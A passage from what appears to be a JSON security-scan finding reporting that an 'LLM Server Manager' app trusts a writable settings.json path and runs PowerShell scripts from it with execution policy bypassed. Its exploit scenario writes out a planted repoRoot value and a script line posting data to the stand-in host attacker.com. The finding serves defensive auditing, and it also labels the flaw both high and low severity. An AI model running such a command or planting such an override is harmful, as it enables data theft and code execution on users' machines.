          ],
          "properties": {
            "severity": "high",
            "security-severity": "7.3",
            "cvssRating": "High",
            "category": "CWE-720",
            "cvssVector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H",
            "cwe": "CWE-720",
            "cweId": "CWE-720",
            "cvssScore": 7.3,
            "offensivePriority": "P3",
            "offensivePriorityLabel": "Internal Network / Privileged Position",
            "offensivePriorityReason": "Internal Network / Privileged Position | *AV:L (non-network)*",
            "confidence": 0.72,
            "description": "#### Description\nRepoLocator.LoadSettingsOverride (line 30-48) reads the repoRoot field from settings.json located at AppContext.BaseDirectory. MainViewModel.LocateRepo (line 152-159) accepts any path that contains an llm-servers subdirectory, with no allow-list or validation that the path is within the expected repository. ScriptScanner.GetTabs (line 25-48) constructs script directories under that repoRoot, and ScanTab (line 51-73) enumerates start-*.ps1 files. When the user clicks Start, ProcessRunner.StartScript (line 10-24) launches powershell.exe with -NoProfile -ExecutionPolicy Bypass -File <scriptPath>, executing the script content verbatim. The only validation is Directory.Exists(Path.Combine(overridePath, \"llm-servers\")) at MainViewModel.cs:155, which an attacker trivially satisfies by creating the directory structure. The settings.json file is written by the app itself via SaveSettingsOverride (line 50-55) when the user browses to a folder, but any process with write access to AppContext.BaseDirectory (sibling process, shared install directory, or a different user on a shared-permissions install) can overwrite it.\n\n#### Impact\nA local process or user who can write settings.json in the app's base directory can point the LLM Server Manager at an attacker-controlled directory containing malicious .ps1 scripts. When the user clicks Start on one of those scripts, it executes with powershell.exe -ExecutionPolicy Bypass, yielding arbitrary PowerShell code execution under the user's account.\n\n#### Exploit scenario\nAttacker writes {\"repoRoot\":\"C:\\\\attacker\\\\dir\"} to <AppContext.BaseDirectory>\\\\settings.json and creates C:\\\\attacker\\\\dir\\\\llm-servers\\\\beellama\\\\scripts\\\\start-gpu.ps1 containing [ValidateSet('gpu')][string]$Mode; Invoke-WebRequest http://attacker.com/x -Method POST. When the user opens LlmServerManager, the app scans the attacker directory and displays a 'Gpu' option. Clicking Start executes the malicious script with -ExecutionPolicy Bypass, exfiltrating data or installing a backdoor.\n\n#### Preconditions\n- Attacker has filesystem write access to the LlmServerManager AppContext.BaseDirectory (e.g., same-user process, shared install path, or misconfigured directory permissions)\n- User opens LlmServerManager and clicks Start on the attacker's script option\n\n```\nvar path = Path.Combine(AppContext.BaseDirectory, \"settings.json\");\nif (!File.Exists(path)) return null;\nusing var doc = JsonDocument.Parse(File.ReadAllText(path));\nif (doc.RootElement.TryGetProperty(\"repoRoot\", out var element))\n{\n    var value = element.GetString();\n    return string.IsNullOrWhiteSpace(value) ? null : value;\n}\n```\n\n#### How to fix\nValidate the repoRoot value from settings.json against an allow-list of known repository locations (e.g., require it to contain a .git directory or a manifest file with a known hash). Alternatively, remove the settings.json override entirely and only use RepoLocator.FindFrom(AppContext.BaseDirectory) which walks up from the install directory and is harder to redirect. If the override must be kept, store the repoRoot in a registry key under HKCU with restricted permissions rather than a world-readable JSON file next to the executable.\n\n**Exploitability:** Likely CVSS 7-8-class: a writable settings.json repoRoot redirects script scanning to an attacker-controlled directory, and Start executes the resulting PowerShell script with bypassed execution policy. The primitive is local process execution once an attacker can modify the app directory or shared install location. It is a strong local-to-RCE bridge on Windows hosts.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 8/10) \u2014 verified unvalidated settings.json repoRoot \u2192 llm-servers script enumeration \u2192 powershell -ExecutionPolicy Bypass -File chain with no allow-list/signature/elevation defence; real low-severity flaw for shared/mispermissioned installs per Rule A's boundary-crossing carve-out"
          },
